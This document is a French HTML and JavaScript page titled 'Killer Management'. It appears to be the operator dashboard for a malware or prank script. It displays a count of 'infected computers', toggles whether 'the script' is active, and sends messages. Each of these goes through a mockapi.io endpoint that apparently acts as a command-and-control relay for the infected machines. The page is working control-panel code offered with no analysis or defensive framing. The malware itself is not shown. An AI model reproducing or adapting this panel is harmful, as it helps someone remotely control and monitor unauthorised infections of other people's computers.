<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Killer Management</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="bg-light">

    <div class="container py-5">
        <div class="card shadow-sm mx-auto" style="max-width: 400px;">
            <div class="card-body text-center">
                <h3 class="card-title mb-4">Killer Management</h3>
                <p>
                    Nombre d'ordinateur infecté : 
                    <span id="spaNbPcInfect" class="fw-bold">-</span>
                    <button id="btnRefresh" class="btn btn-outline-secondary btn-sm ms-2 p-1" title="Rafraîchir le nombre d'ordinateurs infectés">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" id="loadingIcon" class="bi bi-arrow-clockwise" viewBox="0 0 16 16">
                            <path fill-rule="evenodd" d="M8 3a5 5 0 1 0 4.546 2.914.5.5 0 0 1 .908-.417A6 6 0 1 1 8 2z"/>
                            <path d="M8 4.466V.534a.25.25 0 0 1 .41-.192l2.36 1.966c.12.1.12.284 0 .384L8.41 4.658A.25.25 0 0 1 8 4.466"/>
                        </svg>
                    </button>
                </p>
                <hr class="my-4">
                <button id="btnIsActive" class="btn btn-primary mb-3">Changer l'activité du script</button>
                <p class="mb-0">Valeur actuelle : 
                    <span id="SpaIsActive" class="fw-bold text-success">...</span>
                </p>
                <hr class="my-4">
                <h5>Envoyer un message</h5>
                <form id="messageForm">
                    <div class="mb-3 text-start">
                        <label for="messageInput" class="form-label">Message</label>
                        <textarea class="form-control" id="messageInput" rows="3" required></textarea>
                    </div>
                    <button type="submit" class="btn btn-success w-100">Envoyer</button>
                </form>
                <div id="messageFeedback" class="mt-3 text-success fw-bold" style="display: none;">
                    Message envoyé !
                </div>
            </div>
        </div>
    </div>
    <style>
        @keyframes rotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading {
            animation: rotate 1s linear infinite;
        }
    </style>
    <script>
        const btnIsActive = document.getElementById('btnIsActive');
        const SpaIsActive = document.getElementById('SpaIsActive');
        const form = document.getElementById('messageForm');
        const messageInput = document.getElementById('messageInput');
        const messageFeedback = document.getElementById('messageFeedback');
        const btnRefresh = document.getElementById('btnRefresh');
        const SpaNbPcInfect = document.getElementById('spaNbPcInfect');
        const loadingIcon = document.getElementById('loadingIcon');
        const timeToWait = 10000;
        const url = 'https://68138d49129f6313e211a66e.mockapi.io/management/1';
        let isActive;
        let messageIncr;
        let nbPcInfectIncr;

        initialize();

        btnIsActive.addEventListener('click', function () {
            isActive = !isActive;
            SpaIsActive.innerText = isActive ? 'Actif' : 'Inactif';
            SpaIsActive.className = isActive ? 'fw-bold text-success' : 'fw-bold text-danger';
            btnIsActive.disabled = true;

            let secondsLeft = timeToWait / 1000;
            const originalText = btnIsActive.innerText;
            btnIsActive.innerText = `Attendez ${secondsLeft}s`;

            const countdown = setInterval(() => {
                secondsLeft--;
                btnIsActive.innerText = `Attendez ${secondsLeft}s`;
                if (secondsLeft <= 0) {
                    clearInterval(countdown);
                    btnIsActive.disabled = false;
                    btnIsActive.innerText = originalText;
                }
            }, 1000);

            fetch(url, {
                method: 'PUT',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ isActive: isActive })
            }).catch(error => {
                console.error('Erreur lors de la mise à jour:', error);
                clearInterval(countdown);
                btnIsActive.disabled = false;
                btnIsActive.innerText = originalText;
            });
        });

        form.addEventListener('submit', function (e) {
            e.preventDefault();

            const messageText = messageInput.value;
            const submitButton = form.querySelector('button[type="submit"]');
            const originalText = submitButton.innerText;

            submitButton.disabled = true;
            let secondsLeft = timeToWait / 1000;
            submitButton.innerText = `Attendez ${secondsLeft}s`;

            const countdown = setInterval(() => {
                secondsLeft--;
                submitButton.innerText = `Attendez ${secondsLeft}s`;
                if (secondsLeft <= 0) {
                    clearInterval(countdown);
                    submitButton.disabled = false;
                    submitButton.innerText = originalText;
                }
            }, 1000);

            fetch(url, {
                method: 'PUT',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    message: {
                        message: messageText,
                        incr: messageIncr + 1
                    }
                })
            })
            .then(() => {
                messageInput.value = '';
                messageIncr += 1;
                messageFeedback.className = 'mt-3 text-success fw-bold';
                messageFeedback.innerText = 'Message envoyé !';
                messageFeedback.style.display = 'block';
                setTimeout(() => {
                    messageFeedback.style.display = 'none';
                }, 3000);
            })
            .catch(error => {
                console.error('Erreur lors de l\'envoi du message:', error);
                clearInterval(countdown);
                submitButton.disabled = false;
                submitButton.innerText = originalText;
                messageFeedback.innerText = 'Erreur lors de l’envoi.';
                messageFeedback.className = 'mt-3 text-danger fw-bold';
                messageFeedback.style.display = 'block';
            });
        });

        btnRefresh.addEventListener('click', function () {
            btnRefresh.disabled = true;

            const originalText = btnRefresh.innerHTML;
            let secondsLeft = 10;
            btnRefresh.innerText = `Attendez ${secondsLeft}s`;

            const countdown = setInterval(() => {
                secondsLeft--;
                btnRefresh.innerText = `Attendez ${secondsLeft}s`;

                if (secondsLeft <= 0) {
                    clearInterval(countdown);
                    btnRefresh.disabled = false;
                    btnRefresh.innerHTML = originalText;

                    fetch(url)
                        .then(response => response.json())
                        .then(data => {
                            nbPcInfectIncr = data.nbPcInfect.nbPcInfectIncr;
                            SpaNbPcInfect.innerText = data.nbPcInfect.nbPcInfect;
                        })
                        .catch(error => {
                            console.error('Erreur lors de la récupération des données:', error);
                        });
                }
            }, 1000);

            fetch(url, {
                method: 'PUT',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    nbPcInfect: {
                        nbPcInfect: 0,
                        nbPcInfectIncr: nbPcInfectIncr + 1
                    }
                })
            })
            .catch(error => {
                console.error('Erreur lors de la mise à jour des données:', error);
                clearInterval(countdown);
                btnRefresh.disabled = false;
                btnRefresh.innerText = originalText;
            });
        });

        function initialize() {
            fetch(url)
                .then(response => response.json())
                .then(data => {
                    isActive = data.isActive;
                    SpaIsActive.innerText = isActive ? 'Actif' : 'Inactif';
                    SpaIsActive.className = isActive ? 'fw-bold text-success' : 'fw-bold text-danger';
                    SpaNbPcInfect.innerText = "-";

                    nbPcInfectIncr = data.nbPcInfect.nbPcInfectIncr;
                    messageIncr = data.message.incr;
                })
                .catch(error => {
                    console.error('Erreur lors de l\'initialisation:', error);
                    SpaIsActive.innerText = 'Erreur';
                    SpaIsActive.className = 'fw-bold text-warning';
                });
        }
    </script>

</body>
</html>
